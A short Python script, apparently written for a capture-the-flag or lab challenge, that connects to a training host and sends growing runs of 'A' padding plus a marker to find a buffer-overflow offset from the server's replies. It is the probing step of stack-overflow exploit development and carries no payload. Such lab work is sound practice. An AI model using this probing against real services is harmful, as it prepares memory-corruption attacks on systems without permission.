import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31890


def probe(n):
    try:
        s = socket.create_connection((HOST, PORT), timeout=12)
        s.settimeout(4)
        time.sleep(0.4)
        try:
            s.recv(8192)
        except Exception:
            pass
        s.sendall(b"A" * n + b"BBBBBBBB" + b"\n")
        time.sleep(0.5)
        out = b""
        try:
            out = s.recv(8192)
        except Exception:
            pass
        txt = out.decode("utf-8", "replace")
        m = re.search(r"code == (0x[0-9a-f]+)", txt)
        s.close()
        return m.group(1) if m else None
    except Exception:
        return None


for n in range(256, 301, 2):
    print(n, "->", probe(n))
